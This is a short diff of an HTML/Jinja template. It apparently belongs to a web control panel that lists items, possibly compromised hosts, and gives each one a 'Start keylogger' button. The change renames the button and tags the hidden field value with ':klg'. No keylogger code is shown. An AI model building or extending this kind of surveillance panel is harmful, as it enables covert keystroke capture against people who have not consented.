@@ -9,8 +9,8 @@
         <tr>
         	<th> {{ item }} </th>
         	<th><form method="post"> 
-				<input type="submit" name="keylogbtn" value='Start keylogger'> 
-				<input name="keyloginfo" type="hidden" value={{item}}> 
+				<input type="submit" name="submit" value='Start keylogger'> 
+				<input name="keyloginfo" type="hidden" value='{{item}}:klg'> 
 		</form></th>
 	</tr>
 	{% endfor %}
